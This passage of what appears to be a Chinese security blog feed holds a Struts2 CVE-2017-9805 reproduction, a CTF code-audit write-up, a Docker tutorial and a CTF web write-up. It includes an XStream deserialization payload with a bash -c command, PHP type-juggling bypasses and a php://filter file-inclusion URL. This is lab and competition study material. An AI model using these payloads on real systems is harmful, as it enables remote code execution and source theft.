class="hljs-tag">&lt;/<span class="hljs-title">method</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">filter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">next</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“string”</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-title">next</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">serviceIterator</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">lock</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">cipher</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">“java.lang.ProcessBuilder$NullInputStream”</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">ibuffer</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">done</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">ostart</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">ofinish</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">closed</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">is</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">consumed</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">dataSource</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">transferFlavors</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">dataHandler</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">dataLen</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">value</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">“../jdk.nashorn.internal.objects.NativeString”</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">entry</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">entry</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">“../../entry/jdk.nashorn.internal.objects.NativeString”</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">“../../entry/jdk.nashorn.internal.objects.NativeString”</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">map</span>&gt;</span></span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170907214053546?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170907215920821?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x3-攻击后续">0x3 攻击后续</h2><br><p>其实在正真测试的时候已近发现了一些指令受了限制，但是一开始并没有进行研究，今天瞅了一眼freebuf文章，看是已经能够执行任何指令，这里是<a href="http://www.freebuf.com/vuls/147017.html" target="_blank" rel="external">连接</a></p><br><p>我在这也是实验了一发，试了一下文中说的其他指令，但唯独shell反弹没有成功</p><br><p>文中主要说的利用方法是利用bash -c指令 <br><br>具体格式如下<br></p><br><pre class="prettyprint"><code class=" hljs livecodeserver">&lt;<span class="hljs-command"><span class="hljs-keyword">command</span>&gt;</span><br>&lt;<span class="hljs-keyword">string</span>&gt;bash&lt;/<span class="hljs-keyword">string</span>&gt;<br>&lt;<span class="hljs-keyword">string</span>&gt;-c&lt;/<span class="hljs-keyword">string</span>&gt;<br>&lt;<span class="hljs-keyword">string</span>&gt;echo asd &gt;/tmp/<span class="hljs-number">4</span>ct10n&lt;/<span class="hljs-keyword">string</span>&gt;<br>&lt;/<span class="hljs-command"><span class="hljs-keyword">command</span>&gt;</span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170908174121558?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>怎么反弹shell …….  ，在线等</p><br><h1 id="0x02-漏洞分析">0x02 漏洞分析</h1><br><p>未完待续</p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。0x01 漏洞简介漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。  Struts2 REST插件的XStre&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞调试" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 X-NUCA 代码审计</title>
    <link href="http://yoursite.com/2017/08/26/2017%20X-NUCA%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2017/08/26/2017 X-NUCA 代码审计/</id>
    <published>2017-08-26T14:06:00.000Z</published>
    <updated>2017-10-22T02:14:21.959Z</updated>
    
    <content type="html"><![CDATA[<p>今天的比赛中的一道代码审计的题目。<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>今天的比赛中的一道代码审计的题目。</p><br><h1 id="step-1-初步审计">step 1 初步审计</h1><br><p>发现所有的数据库操作都是 PDO操作，这也就意味着不可能是SQL注入了。查找flag出现的位置</p><br><p><code>do_changepass.php</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826214331523?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><code>user.php</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826214358772?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现如果是要获取flag 那么必须要更改userinfo数组的值····<br><br><br><br></p><br><h1 id="step-2-代码回溯">step 2 代码回溯</h1><br><p>我们发现在上述两个页面userinfo的值就是session的值，所以目标转化为更改session值，找到登录后的操作 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826215547172?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>在这里发现了<code>$_session[userinfo]</code>的赋值操作$userinfo，本来userinfo是数组，我们在这里有个变量覆盖 <br><br><code>common.php</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826215143656?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><p>我们如果传入<code>?userinfo=a</code>那么就是一个字符串这时 <br><br><code>$userinfo[“id”]=$userinfo[0]=a</code><br></p><br><p>我们看register.php <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826215734073?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><code>role = 1</code><br><br></p><br><p>所以<code>$_session[userinfo]=’1’</code> session是字符串1</p><br><p>这时再次访问do_changepass.php即可</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170826220556116?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天的比赛中的一道代码审计的题目。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>Docker 使用总结</title>
    <link href="http://yoursite.com/2017/08/20/Docker%20%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/08/20/Docker 使用总结/</id>
    <published>2017-08-20T05:12:00.000Z</published>
    <updated>2017-10-22T02:14:22.411Z</updated>
    
    <content type="html"><![CDATA[<p>docker在平时的使用中还是比较常见的，这里简单介绍一下docker以及其使用方法，希望对大家有用<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>docker在平时的使用中还是比较常见的，这里简单介绍一下docker以及其使用方法，希望对大家有用。</p><br><h1 id="0x01-初识docker">0x01 初识docker</h1><br><p>Docker 从 0.9 版本开始使用 libcontainer 替代 lxc，libcontainer 和 Linux 系统的交互图如下： <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170820095326651?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>并且docker安装容器的操作系统位数和物理机是统一的，也就是说64位操作系统只能使用64位docker容器，docker分为image和容器，一个镜像可以生成多个容器，并且容器的环境是相同的。</p><br><h1 id="0x02-基本指令">0x02 基本指令</h1><br><p>参数： <br><br>–name  指定容器的名字 <br><br>–rm      容器运行完毕会自动删除 <br><br>-i -t       创建一个提供交互式shell的容器。 <br><br>-d         在后台运行容器，并且打印出容器的ID。 <br><br>后面加的是容器刚生成是运行的程序默认是/bin/bash<br><br><br><br><br></p><br><h2 id="0x1-容器生成">0x1 容器生成</h2><br><p><code>docker run –name  weblogic -i -t centos</code> <br><br>上述命令会生成一个名字为weblogic 的交互式容器，默认执行的是/bin/bash，所以会进入交互界面。如果本地没有centos的镜像会从远程下载到本地。<br></p><br><h2 id="0x2-生成容器时的其他属性">0x2 生成容器时的其他属性</h2><br><p>docker run 命令用于生成容器 ，生成容器的属性之后不能再改变</p><br><h3 id="端口映射">端口映射</h3><br><p>一般拥有web服务的容器都进行端口映射，将docker的80端口映射到主机的8000端口 <br><br><code>docker run -d -p 8000:80  foo/live /bin/bash</code><br></p><br><h3 id="环境变量">环境变量</h3><br><p>在配置mysql  docker的时候使用-e参数设置环境变量 <br><br><code>docker run –name first-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</code><br></p><br><h2 id="0x3-打开关闭附加删除">0x3 打开/关闭/附加/删除</h2><br><p><code>docker  start  id  使上述生成的容器启动</code> <br><br><code>docker  stop id  使上述生成的容器关闭</code> <br><br><code>docker exec -it id  /bin/bash  附加正在运行的容器</code> <br><br><code>docker attach continer id/name</code> <br><br>当重新启动容器时，会沿用创建容器（docker run）命令时指定的参数来运行，可能需要按回车才进入。 <br><br>这时就已经相当于在容器内部了的shell操作了。如果操作过程中，退出了shell。容器也会随之停止。<br><br><br><br><br></p><br><p>exec与attach的区别是当exit容器的时候exec不停止容器，而attach会将容器停止</p><br><hr><br><p>删除时必须保证容器时关闭的 <br><br><code>docker  rm name/id 删除指定容器</code> <br><br>删除所有镜像  <br><br><code>docker rmi $(docker images -q)1</code> <br><br>根据格式删除所有镜像 <br><br><code>docker rm $(docker ps -qf status=exited)</code><br><br><br><br><br></p><br><h2 id="0x4-压缩导出上传">0x4 压缩/导出/上传</h2><br><p>我们用镜像生成了容器，然后我们可以将容器生成镜像，然后将镜像打成压缩包方便导入导出，同时也可以把镜像上传至dockerhub，供别人下载使用</p><br><h3 id="压缩容器">压缩(容器)</h3><br><p>我们使用容器 furious_bell，现在要将这个容器保存为一个文件 myunbuntu-export-1204.tar <br><br><code>docker export furious_bell &gt; /home/myubuntu-export-1204.tar</code><br></p><br><h3 id="导入">导入</h3><br><p><code>docker import  /home/myubuntu-export-1204.tar  alias</code></p><br><h3 id="压缩镜像">压缩（镜像）</h3><br><p>这里有个基础镜像：ubuntu:12.04，现在要将这个镜像保存为一个文件myubuntu-save-1204.tar <br><br><code>docker save 9610cfc68e8d &gt; /home/myubuntu-save-1204.tar</code> <br><br>有点慢，稍微等待一下，没有任何warn信息就表示保存OK。9610cfc68e8d 是镜像ID<br><br></p><br><h3 id="导入-1">导入</h3><br><p><code>docker load /home/myubuntu-export-1204.tar  alias</code></p><br><h3 id="上传至远程仓库">上传至远程仓库</h3><br><p>首先拥有一个dockerhub账号 <br><br>上传之前要登录 <br><br><code>docker login</code> <br><br>然后输入用户名密码<br><br><br></p><br><p><code>docker push image name</code></p><br><p>关于docker file的编写，有时间再补上</p><br><h1 id="0x3-dockerfile-编写">0x3 Dockerfile 编写</h1><br><blockquote><br><p>Dockfile是一种被Docker程序解释的脚本，Dockerfile由一条一条的指令组成，每条指令对应Linux下面的一条命令。Docker程序将这些Dockerfile指令翻译真正的Linux命令。Dockerfile有自己书写格式和支持的命令，Docker程序解决这些命令间的依赖关系，类似于Makefile。</p><br></blockquote><br><p>首先给个实例 <br><br>运行指令<code>docker build -t name .</code><br></p><br><pre class="prettyprint"><code class=" hljs vbnet"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">16.04</span><br><br>MAINTAINER <span class="hljs-number">4</span>t10n &lt;act01n@<span class="hljs-number">163.</span>com&gt;<br>ENV DEBIAN_FRONTEND noninteractive<br><span class="hljs-preprocessor">#这里添加更新源 </span><br>RUN sed -i <span class="hljs-comment">‘s/archive.ubuntu.com/mirrors.ustc.edu.cn/g’ /etc/apt/sources.list</span><br><br>RUN apt-<span class="hljs-keyword">get</span> update -y &amp;&amp; \<br>    apt-<span class="hljs-keyword">get</span> install -y apache2 \<br>    vim \<br>    tar \<br>    php7<span class="hljs-number">.0</span>-fpm \<br>    php7<span class="hljs-number">.0</span>-mcrypt \<br>    php7<span class="hljs-number">.0</span>-mysql  \<br>    mysql-client \<br>    mysql-server   \<br>    &amp;&amp; /etc/init.d/mysql start \<br>    &amp;&amp; mysqladmin -uroot password root  \<br>    &amp;&amp; rm -rf /var/<span class="hljs-keyword">lib</span>/apt/lists/<em><br><br>WORKDIR /tmp<br><span class="hljs-preprocessor">#COPY  ./start.sh  /tmp/</span><br><span class="hljs-preprocessor">#COPY  ./init.sql  /tmp/ </span><br><span class="hljs-preprocessor">#RUN  chmod a+x start.sh </span><br><br><span class="hljs-preprocessor">#设置数据库 </span><br>RUN <span class="hljs-keyword">set</span> -x \<br>    &amp;&amp; service mysql start \<br>    &amp;&amp; mysql  -e <span class="hljs-string">“CREATE DATABASE  blog  DEFAULT CHARACTER SET utf8;”</span>  -uroot  -proot \<br>    &amp;&amp;  mysql -e <span class="hljs-string">“grant select,insert on blog.</span></em> to ‘admin’@’localhost’ identified by ‘password’ “  -uroot -proot<br><br><span class="hljs-preprocessor"># copy 源码</span><br><span class="hljs-preprocessor">#COPY  ./default /etc/nginx/sites-available/default</span><br><span class="hljs-preprocessor">#COPY ./src /usr/share/nginx/html/</span><br>COPY ./<span class="hljs-number">1.</span>php /var/www/html/<br><br><span class="hljs-preprocessor"># 设置可写权限 </span><br>RUN chown -R  www-data:www-data /var/www/html/<br>EXPOSE <span class="hljs-number">80</span> <span class="hljs-number">3306</span><br><br>CMD [<span class="hljs-string">“/tmp/start.sh”</span>]</code></pre><br><h2 id="0x1-from">0x1 FROM</h2><br><p>FROM指定一个基础镜像， 一般情况下一个可用的 Dockerfile一定是 FROM 为第一个指令。</p><br><h2 id="0x2-maintainer">0x2 MAINTAINER</h2><br><p>这里是用于指定镜像制作者的信息</p><br><h2 id="0x3-run">0x3 RUN</h2><br><p>RUN命令将在当前image中执行任意合法命令并提交执行结果。命令执行提交后，就会自动执行Dockerfile中的下一个指令。 <br><br>层级 RUN 指令和生成提交是符合Docker核心理念的做法。它允许像版本控制那样，在任意一个点，对image 镜像进行定制化构建。<br></p><br><h2 id="0x4-env">0x4 ENV</h2><br><p>ENV指令可以用于为docker容器设置环境变量 <br><br>ENV设置的环境变量，可以使用 docker inspect命令来查看。同时还可以使用docker run –env =来修改环境变量。<br></p><br><h2 id="0x5-workdir">0x5 WORKDIR</h2><br><p>WORKDIR 用来切换工作目录的。Docker 默认的工作目录是/，只有 RUN 能执行 cd 命令切换目录，而且还只作用在当下下的 RUN，也就是说每一个 RUN 都是独立进行的。如果想让其他指令在指定的目录下执行，就得靠 WORKDIR。WORKDIR 动作的目录改变是持久的，不用每个指令前都使用一次 WORKDIR。</p><br><h2 id="0x6-copy">0x6 COPY</h2><br><p>COPY 将文件从路径<code>&lt;src&gt;</code>复制添加到容器内部路径 <code>&lt;dest&gt;</code></p><br><p><code>&lt;src&gt;</code>必须是想对于源文件夹的一个文件或目录，也可以是一个远程的url，<code>&lt;dest&gt;</code> <br><br>是目标容器中的绝对路径。 <br><br>所有的新文件和文件夹都会创建UID 和 GID 。事实上如果<code>&lt;src&gt;</code> 是一个远程文件URL，那么目标文件的权限将会是600。<br><br></p><br><h2 id="0x7-add">0x7 ADD</h2><br><p>ADD 将文件从路径  复制添加到容器内部路径  <br><br>同COPY<br></p><br><h2 id="0x8-expose">0x8 EXPOSE</h2><br><p>EXPOSE 指令指定在docker允许时指定的端口进行转发。</p><br><h2 id="0x9-cmd">0x9 CMD</h2><br><p>Dockerfile.中只能有一个CMD指令。 如果你指定了多个，那么最后个CMD指令是生效的。 <br><br>CMD指令的主要作用是提供默认的执行容器。这些默认值可以包括可执行文件，也可以省略可执行文件。 <br><br>当你使用shell或exec格式时， CMD <br><br>会自动执行这个命令。<br><br><br></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;docker在平时的使用中还是比较常见的，这里简单介绍一下docker以及其使用方法，希望对大家有用&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件及应用配置" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E5%8F%8A%E5%BA%94%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup</title>
    <link href="http://yoursite.com/2017/08/14/2017%E5%90%88%E5%A4%A9%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B%E4%B8%93%E9%A2%98%E8%B5%9B--%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup/"/>
    <id>http://yoursite.com/2017/08/14/2017合天全国高校网安联赛专题赛--赛前指导练习题web进阶篇Writeup/</id>
    <published>2017-08-14T10:52:00.000Z</published>
    <updated>2017-10-22T02:14:22.851Z</updated>
    
    <content type="html"><![CDATA[<p>趁着放假，再刷一波题目<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>趁着放假，再刷一波题目</p><br><h2 id="0x01-捉迷藏">0x01 捉迷藏</h2><br><p><a href="http://218.76.35.75:20111/" target="_blank" rel="external">链接</a> <br><br>这个有个假flag，太坑了，查看源码有个链接点进去就是flag<br></p><br><h2 id="0x02-简单问答">0x02 简单问答</h2><br><p><a href="http://218.76.35.75:20112" target="_blank" rel="external">链接</a> <br><br>答案是 2016 lol 22 <br><br>记得把q4改成q3，js会有函数干扰 ，用burpsuit就ok<br><br></p><br><h2 id="0x03-后台后台后台">0x03     后台后台后台</h2><br><p><a href="http://218.76.35.75:20113" target="_blank" rel="external">链接</a> <br><br><code>PHPSESSID=qoercfqn062v19035374ten1d2; User=JohnTan101; Member=Tm9ybWFs</code> <br><br>提示用admin登录 <br><br>发现 member是base64编码的将Admin用base64编码提交即可<br><br><br></p><br><h2 id="0x04-php是最好的语言">0x04 php是最好的语言</h2><br><p><a href="http://218.76.35.75:20114" target="_blank" rel="external">链接</a></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>show_source(<span class="hljs-keyword"><strong>FILE</strong></span>);<br><span class="hljs-variable">$v1</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v2</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v3</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)json_decode(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘foo’</span>]);<br><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$a</span>)){<br>    is_numeric(@<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar1”</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">“nope”</span>):<span class="hljs-keyword">NULL</span>;<br>    <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar1”</span>]){<br>        (<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar1”</span>]&gt;<span class="hljs-number">2016</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-keyword">NULL</span>;<br>    }<br>    <span class="hljs-keyword">if</span>(is_array(@<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar2”</span>])){<br>        <span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar2”</span>])!==<span class="hljs-number">5</span> <span class="hljs-keyword">OR</span> !is_array(<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar2”</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">“nope”</span>);<br>        <span class="hljs-variable">$pos</span> = array_search(<span class="hljs-string">“nudt”</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">“a2”</span>]);<br>        <span class="hljs-variable">$pos</span>===<span class="hljs-keyword">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">“nope”</span>):<span class="hljs-keyword">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">“bar2”</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">“nudt”</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">“nope”</span>):<span class="hljs-keyword">NULL</span>;<br>        }<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>    }<br>}<br><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘cat’</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘dog’</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]){<br>    <span class="hljs-keyword">if</span>(!strcmp(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>){<br>        eregi(<span class="hljs-string">“3|1|c”</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">“nope”</span>):<span class="hljs-keyword">NULL</span>;<br>        strpos((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">“htctf2016”</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-keyword">NULL</span>;<br>    }<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> &amp;&amp; <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-variable">$v3</span>){<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">“flag.php”</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><span class="hljs-preprocessor">?&gt;</span></span></code></pre><br><p>这个好像是去年的题目，做了好几次，说点不一样的 <br><br>1. 记住一点字符串与数字比较时会先转换成数字再比较 <br><br>2. 还有一点<code>$pos = array_search(“nudt”, $a[“a2”]);</code>这个在绕过的时候也是利用上面的那一点，所以有0就可以了 <br><br>3. eregi的%00截断<br><br><br></p><br><h2 id="0x5-login">0x5 login</h2><br><p><a href="http://218.76.35.75:20115" target="_blank" rel="external">链接</a> <br><br>打开一看典型的文件包含，利用PHP协议读取所有源码 <br><br>利用方法<code><a href="http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=main" target="_blank" rel="external">http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=main</a></code><br><br></p><br><p>index.php</p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-variable">$pwhash</span>=<span class="hljs-string">“ffd313052dab00927cb61064a392f30ee454e70f”</span>;<br><br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘log’</span>]) {<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘log’</span>].<span class="hljs-string">“.log”</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">“flag.txt”</span>);<br>}<br>}<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘page’</span>] != <span class="hljs-string">‘index’</span>){<br>    <span class="hljs-keyword">include</span>((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘page’</span>]?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘page’</span>].<span class="hljs-string">“.php”</span>:<span class="hljs-string">“main.php”</span>));<br>}<br><br><span class="hljs-preprocessor">?&gt;</span></span><br></code></pre><br><p>login.php</p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-variable">$login</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘login’</span>];<br><span class="hljs-variable">$password</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘password’</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$login</span>==<span class="hljs-string">“admin”</span> &amp;&amp; sha1(@<span class="hljs-variable">$password</span>)==<span class="hljs-variable">$pwhash</span>){<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">‘flag.txt’</span>);<br>}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (@<span class="hljs-variable">$login</span>&amp;&amp;@<span class="hljs-variable">$password</span>&amp;&amp;@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘debug’</span>]) {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">“Login error, login credentials has been saved to ./log/“</span>.htmlentities(<span class="hljs-variable">$login</span>).<span class="hljs-string">“.log”</span>;<br>    <span class="hljs-variable">$logfile</span> = <span class="hljs-string">“./log/“</span>.<span class="hljs-variable">$login</span>.<span class="hljs-string">“.log”</span>;<br>    file_put_contents(<span class="hljs-variable">$logfile</span>, <span class="hljs-variable">$login</span>.<span class="hljs-string">“\n”</span>.<span class="hljs-variable">$password</span>);<br>}<br><span class="hljs-preprocessor">?&gt;</span></span><br>    <span class="hljs-tag">&lt;<span class="hljs-title">center</span>&gt;</span><br>        login<span class="hljs-tag">&lt;<span class="hljs-title">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">“”</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">“POST”</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">“login”</span> <span class="hljs-attribute">placeholder</span>=<span class="hljs-value">“login”</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">br</span>/&gt;</span><br>            <span 